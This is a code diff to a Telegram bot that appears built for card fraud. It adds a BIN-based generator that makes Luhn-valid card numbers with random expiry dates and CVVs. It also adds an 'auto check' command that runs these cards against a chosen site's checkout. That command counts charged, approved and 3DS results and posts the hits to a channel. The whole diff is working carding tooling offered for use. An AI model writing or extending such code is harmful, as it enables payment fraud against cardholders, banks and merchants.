@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+import random
 import aiohttp
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -144,6 +145,37 @@ async def get_bin_info(cc):
             'level': 'N/A', 'type': 'N/A', 'flag': ''}
 
 
+def generate_cards_from_bin(bin_str, count=10):
+    bin_str = bin_str.strip().replace(' ', '')
+    bin_digits = ''.join(c for c in bin_str if c.isdigit() or c == 'x')
+    if len(bin_digits) < 6:
+        return []
+    cards = []
+    for _ in range(count):
+        cc = ''
+        for i, ch in enumerate(bin_digits[:16]):
+            if ch == 'x':
+                cc += str(random.randint(0, 9))
+            else:
+                cc += ch
+        while len(cc) < 16:
+            cc += str(random.randint(0, 9))
+        # Luhn fix
+        digits = [int(d) for d in cc[:15]]
+        odd_sum = sum(digits[0::2])
+        even_sum = 0
+        for d in digits[1::2]:
+            d2 = d * 2
+            even_sum += d2 - 9 if d2 > 9 else d2
+        check = (10 - (odd_sum + even_sum) % 10) % 10
+        cc = cc[:15] + str(check)
+        month = str(random.randint(1, 12)).zfill(2)
+        year = str(random.randint(26, 30))
+        cvv = str(random.randint(100, 999))
+        cards.append(f"{cc}|{month}|{year}|{cvv}")
+    return cards
+
+
 def fmt_price(price, currency):
     try:
         if not price or price == '0':
@@ -215,6 +247,8 @@ def main_menu_keyboard():
         [InlineKeyboardButton("🌐 𝐒𝐢𝐭𝐞 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_site"),
          InlineKeyboardButton("📡 𝐌𝐚𝐬𝐬 𝐒𝐢𝐭𝐞", callback_data="btn_msite")],
         [InlineKeyboardButton("🏦 𝐁𝐈𝐍 𝐋𝐨𝐨𝐤𝐮𝐩", callback_data="btn_bin"),
+         InlineKeyboardButton("🎲 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞", callback_data="btn_gen")],
+        [InlineKeyboardButton("⚡ 𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤", callback_data="btn_autochk"),
          InlineKeyboardButton("❓ 𝐇𝐞𝐥𝐩", callback_data="btn_help")],
     ])
 
@@ -335,6 +369,33 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['awaiting'] = 'bin'
         return
 
+    if data == "btn_gen":
+        await query.edit_message_text(
+            "🎲 <b>𝐁𝐈𝐍 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫</b>\n\n"
+            "Send BIN (6-16 digits) and optional count:\n"
+            "<code>527515 10</code>\n\n"
+            "Use <code>x</code> for random digits:\n"
+            "<code>527515xxxxxxxxxx 20</code>\n\n"
+            "Or use: /gen <code>bin [count]</code>",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+        context.user_data['awaiting'] = 'gen'
+        return
+
+    if data == "btn_autochk":
+        await query.edit_message_text(
+            "⚡ <b>𝐀𝐮𝐭𝐨 𝐂𝐡𝐞𝐜𝐤</b>\n\n"
+            "Generate cards from BIN and auto-check against a site.\n\n"
+            "Send: <code>bin site_url [count]</code>\n"
+            "Example: <code>527515 https://example.com 10</code>\n\n"
+            "Or use: /autochk <code>bin site [count]</code>",
+            parse_mode="HTML",
+            reply_markup=back_button(),
+        )
+        context.user_data['awaiting'] = 'autochk'
+        return
+
     if data == "btn_help":
         context.user_data['awaiting'] = None
         await query.edit_message_text(
@@ -343,11 +404,14 @@ async def button_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "📋 <b>Mass Check</b> — /mass <code>site</code> (reply to card file)\n"
             "🌐 <b>Site Check</b> — /site <code>url</code>\n"
             "📡 <b>Mass Site</b> — /msite (reply to site file)\n"
-            "🏦 <b>BIN Lookup</b> — /bin <code>123456</code>\n\n"
+            "🏦 <b>BIN Lookup</b> — /bin <code>123456</code>\n"
+            "🎲 <b>Generate</b> — /gen <code>bin [count]</code>\n"
+            "⚡ <b>Auto Check</b> — /autochk <code>bin site [count]</code>\n\n"
             "You can use buttons or commands!\n\n"
             "<b>𝐅𝐨𝐫𝐦𝐚𝐭𝐬:</b>\n"
             "Card: <code>cc_number|mm|yy|cvv</code>\n"
-            "Site: <code>https://example.com</code>\n\n"
+            "Site: <code>https://example.com</code>\n"
+            "BIN: <code>527515</code> or <code>527515xxxxxxxxxx</code>\n\n"
             "𝐃𝐞𝐯 ➜ @Xoarch",
             parse_mode="HTML",
             reply_markup=back_button(),
@@ -454,6 +518,48 @@ async def bin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await handle_bin_lookup(update, context, context.args[0])
 
 
+async def gen_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        await deny(update)
+        return
+    if not context.args:
+        await update.message.reply_text(
+            "Usage: /gen <code>bin [count]</code>\nExample: /gen 527515 10",
+            parse_mode="HTML",
+        )
+        return
+    bin_str = context.args[0]
+    count = 10
+    if len(context.args) > 1:
+        try:
+            count = min(int(context.args[1]), 50)
+        except ValueError:
+            pass
+    await handle_gen(update, context, bin_str, count)
+
+
+async def autochk_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update):
+        await deny(update)
+        return
+    if len(context.args) < 2:
+        await update.message.reply_text(
+            "Usage: /autochk <code>bin site [count]</code>\n"
+            "Example: /autochk 527515 https://example.com 10",
+            parse_mode="HTML",
+        )
+        return
+    bin_str = context.args[0]
+    site = context.args[1]
+    count = 10
+    if len(context.args) > 2:
+        try:
+            count = min(int(context.args[2]), 50)
+        except ValueError:
+            pass
+    await handle_autochk(update, context, bin_str, site, count)
+
+
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update):
         await deny(update)
@@ -465,6 +571,8 @@ async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🌐 /site <code>url</code> — Check if site is alive\n"
         "📡 /msite — Mass site check (reply to file)\n"
         "🏦 /bin <code>123456</code> — BIN lookup\n"
+        "🎲 /gen <code>bin [count]</code> — Generate cards from BIN\n"
+        "⚡ /autochk <code>bin site [count]</code> — Generate + auto check\n"
         "/start — Show button menu\n\n"
         "𝐃𝐞𝐯 ➜ @Xoarch"
     )
@@ -534,6 +642,37 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif awaiting == 'bin':
         context.user_data['awaiting'] = None
         await handle_bin_lookup(update, context, text)
+
+    elif awaiting == 'gen':
+        context.user_data['awaiting'] = None
+        parts_raw = text.split()
+        bin_str = parts_raw[0]
+        count = 10
+        if len(parts_raw) > 1:
+            try:
+                count = min(int(parts_raw[1]), 50)
+            except ValueError:
+                pass
+        await handle_gen(update, context, bin_str, count)
+
+    elif awaiting == 'autochk':
+        context.user_data['awaiting'] = None
+        parts_raw = text.split()
+        if len(parts_raw) < 2:
+            await update.message.reply_text(
+                "Send: <code>bin site_url [count]</code>",
+                parse_mode="HTML", reply_markup=main_menu_keyboard(),
+            )
+            return
+        bin_str = parts_raw[0]
+        site = parts_raw[1]
+        count = 10
+        if len(parts_raw) > 2:
+            try:
+                count = min(int(parts_raw[2]), 50)
+            except ValueError:
+                pass
+        await handle_autochk(update, context, bin_str, site, count)
 
     else:
         if '|' in text and ' ' in text:
@@ -781,6 +920,123 @@ async def handle_mass_site(update: Update, context: ContextTypes.DEFAULT_TYPE, s
         )
 
 
+async def handle_gen(update: Update, context: ContextTypes.DEFAULT_TYPE, bin_str: str, count: int = 10):
+    cards = generate_cards_from_bin(bin_str, count)
+    if not cards:
+        await update.message.reply_text(
+            "Invalid BIN. Send at least 6 digits.",
+            reply_markup=main_menu_keyboard(),
+        )
+        return
+
+    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
+    info = await get_bin_info(bin6)
+    info_str = fmt_info(info['brand'], info['type'], info['level'])
+
+    cards_text = "\n".join([f"<code>{c}</code>" for c in cards])
+    result = (
+        f"<b>🎲 𝐁𝐈𝐍 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫</b>\n"
+        f"━━━━━━━━━━━━━\n"
+        f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
+        f"𝙄𝙣𝙛𝙤: {info_str}\n"
+        f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
+        f"𝘾𝙤𝙪𝗻𝘁𝗿𝐲: {info['country']} {info['flag']}\n"
+        f"𝐂𝐨𝐮𝐧𝐭: {len(cards)}\n"
+        f"━━━━━━━━━━━━━\n"
+        f"{cards_text}\n"
+        f"━━━━━━━━━━━━━\n"
+        f"𝐃𝐞𝐯 ➜ @Xoarch"
+    )
+    await update.message.reply_text(result, parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+
+async def handle_autochk(update: Update, context: ContextTypes.DEFAULT_TYPE, bin_str: str, site: str, count: int = 10):
+    if not site.startswith('http'):
+        site = 'https://' + site
+
+    cards = generate_cards_from_bin(bin_str, count)
+    if not cards:
+        await update.message.reply_text(
+            "Invalid BIN. Send at least 6 digits.",
+            reply_markup=main_menu_keyboard(),
+        )
+        return
+
+    bin6 = ''.join(c for c in bin_str if c.isdigit())[:6]
+    info = await get_bin_info(bin6)
+    info_str = fmt_info(info['brand'], info['type'], info['level'])
+
+    msg = await update.message.reply_text(
+        f"⚡ <b>Auto Check</b>\n"
+        f"BIN: <code>{bin_str}</code> | Site: <code>{site}</code>\n"
+        f"Generated {len(cards)} cards, checking... ⏳",
+        parse_mode="HTML",
+    )
+
+    stats = {'charged': 0, 'approved': 0, 'tds': 0, 'declined': 0, 'error': 0}
+
+    for i, cc_string in enumerate(cards):
+        try:
+            parts = parse_cc_string(cc_string)
+        except Exception:
+            stats['error'] += 1
+            continue
+
+        success, message, gateway, price, currency, category = await run_with_retry(parts, site)
+        stats[category] += 1
+
+        if category in ('charged', 'approved', 'tds'):
+            appr_clean = approved_message(message) if category == 'approved' else None
+            clean = appr_clean if appr_clean else extract_clean_response(message)
+            if category == 'charged':
+                clean = 'ORDER_PLACED'
+            elif category == 'tds':
+                clean = 'OTP_REQUIRED'
+
+            price_fmt = fmt_price(price, currency)
+            result_text = build_result_text(
+                cc_string, category, clean, price_fmt, info_str,
+                info['bank'], info['country'], info['flag']
+            )
+            try:
+                await context.bot.send_message(chat_id=CHANNEL_ID, text=result_text, parse_mode="HTML")
+            except Exception as e:
+                logger.error(f"Channel post error: {e}")
+            await update.message.reply_text(result_text, parse_mode="HTML")
+
+        if (i + 1) % 5 == 0:
+            try:
+                await msg.edit_text(
+                    f"⚡ <b>Auto Check</b> | BIN: <code>{bin_str}</code>\n"
+                    f"Progress: {i + 1}/{len(cards)} ⏳",
+                    parse_mode="HTML",
+                )
+            except Exception:
+                pass
+
+    summary = (
+        f"<b>⚡ 𝐀𝐔𝐓𝐎 𝐂𝐇𝐄𝐂𝐊 𝐑𝐄𝐒𝐔𝐋𝐓𝐒</b>\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"𝐁𝐈𝐍: <code>{bin_str}</code>\n"
+        f"𝙄𝙣𝙛𝙤: {info_str}\n"
+        f"𝘽𝙖𝙣𝙠: {info['bank']}\n"
+        f"𝐓𝐨𝐭𝐚𝐥: {len(cards)}\n\n"
+        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝: {stats['charged']} 🔥\n"
+        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {stats['approved']} ✅\n"
+        f"𝟑𝐃𝐒: {stats['tds']} ❎\n"
+        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {stats['declined']} ❌\n"
+        f"𝐄𝐫𝐫𝐨𝐫𝐬: {stats['error']} ⚠️\n"
+        f"━━━━━━━━━━━━━━\n"
+        f"𝐃𝐞𝐯 ➜ @Xoarch"
+    )
+    await msg.edit_text(summary, parse_mode="HTML", reply_markup=main_menu_keyboard())
+
+    try:
+        await context.bot.send_message(chat_id=CHANNEL_ID, text=summary, parse_mode="HTML")
+    except Exception as e:
+        logger.error(f"Channel summary error: {e}")
+
+
 async def handle_bin_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str):
     bin6 = text.strip()[:6]
     if not bin6.isdigit() or len(bin6) < 6:
@@ -817,6 +1073,8 @@ def build_app():
     app.add_handler(CommandHandler("site", site_cmd))
     app.add_handler(CommandHandler("msite", msite_cmd))
     app.add_handler(CommandHandler("bin", bin_cmd))
+    app.add_handler(CommandHandler("gen", gen_cmd))
+    app.add_handler(CommandHandler("autochk", autochk_cmd))
     app.add_handler(CallbackQueryHandler(button_router))
     app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
